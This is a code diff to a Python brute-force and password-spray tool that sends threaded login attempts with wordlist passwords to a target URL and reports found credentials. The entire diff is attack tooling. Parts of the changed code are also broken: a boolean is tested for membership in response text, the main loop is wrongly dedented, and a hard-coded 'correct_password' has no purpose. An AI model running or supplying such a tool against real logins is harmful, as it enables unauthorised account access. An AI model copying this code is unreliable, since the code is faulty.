@@ -6,6 +6,26 @@ from colorama import Fore, Style
 from tqdm import tqdm
 from concurrent.futures import ThreadPoolExecutor
 
+success = False
+username_field = 'username'
+password_field = 'password'
+correct_password = 'password123'
+
+
+def login(target_url, username, password):
+    global success
+    session = requests.Session()
+    response = session.post(
+        target_url, data={username_field: username, password_field: password})
+    if response.status_code == 200 and success not in response.text:
+        print(f"[+] Found credentials: {username}:{password}")
+        success = True
+        if password == correct_password:
+            print("Correct password")
+    else:
+        print(f"[-] {password} failed")
+    success = False
+
 
 def try_credentials(username, password, target_url):
     session = requests.Session()
@@ -21,7 +41,7 @@ def try_credentials(username, password, target_url):
         sys.exit(0)
     else:
         print(
-            Fore.RED + f'[+] Wrong password: {username}:{password}' + Style.RESET_ALL)
+            Fore.RED + f'[-] Wrong password: {username}:{password}' + Style.RESET_ALL)
 
 
 if __name__ == '__main__':
@@ -31,20 +51,18 @@ if __name__ == '__main__':
     parser.add_argument('target', help='Target URL')
     parser.add_argument('-u', '--username', default='',
                         help='The username to use for the attack')
-    parser.add_argument('-p', '--passwords', help='The file containing passwords (one per line)')
+    parser.add_argument('-p', '--passwords',
+                        help='The file containing passwords (one per line)')
     parser.add_argument('-d', '--dictionary', action='store_true',
                         help='Enable dictionary attack mode.')
     parser.add_argument('-s', '--spray', action='store_true',
                         help='Enable password spray attack mode.')
     parser.add_argument('-t', '--threads', type=int, default=10,
                         help='Number of threads to use for the attack')
-    parser.add_argument('-i', '--info', action='help', default=argparse.SUPPRESS, help='Show this help message and exit')
+    parser.add_argument('-i', '--info', action='store_true',
+                        help='Show this help message and exit')
 
     args = parser.parse_args()
-if args.i:
-    parser.print_help()
-    sys.exit(0)
-
 
     if not args.passwords and not args.dictionary:
         print(
@@ -59,32 +77,38 @@ if args.i:
             passwords = f.read().splitlines()
 
     if not args.username and not args.spray:
-        print(Fore.RED + '[-] Please provide a username or enable password spray mode.' + Style.RESET_ALL)
+        print(
+            Fore.RED + '[-] Please provide a username or enable password spray mode.' + Style.RESET_ALL)
         sys.exit(1)
     elif not args.username:
-        print(colorama.Fore.YELLOW + '[!] No username provided. Performing password spray attack.' + colorama.Style.RESET_ALL)
+        print(colorama.Fore.YELLOW +
+              '[!] No username provided. Performing password spray attack.' + colorama.Style.RESET_ALL)
         usernames = ['']
     else:
         usernames = [args.username]
 
     progress_bar = tqdm(total=len(usernames) * len(passwords),
                         desc='Progress', position=0, leave=True)
-
-    with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        for username in usernames:
-            if args.spray:
-                for password in passwords:
-                    executor.submit(try_credentials, username,
-                                    password, args.target)
-                    progress_bar.update(1)
-            else:
-                for password in passwords:
-                    executor.submit(try_credentials, username,
-                                    password, args.target)
-                    progress_bar.update(1)
+with ThreadPoolExecutor(max_workers=args.threads) as executor:
+    for username in usernames:
+        if args.spray:
+            for password in passwords:
+                executor.submit(try_credentials, username,
+                                password, args.target)
+                progress_bar.update(1)
+        else:
+            for password in passwords:
+                executor.submit(login, args.target, username, password)
+                progress_bar.update(1)
 
     progress_bar.close()
 
     # If no valid credentials found
-    print(Fore.YELLOW +
-          '[*] Unable to find valid credentials.' + Style.RESET_ALL)
+    if not success:
+        print(Fore.YELLOW +
+              '[*] Unable to find valid credentials.' + Style.RESET_ALL)
+
+    if args.info:
+        parser.print_help()
+
+    sys.exit(0)
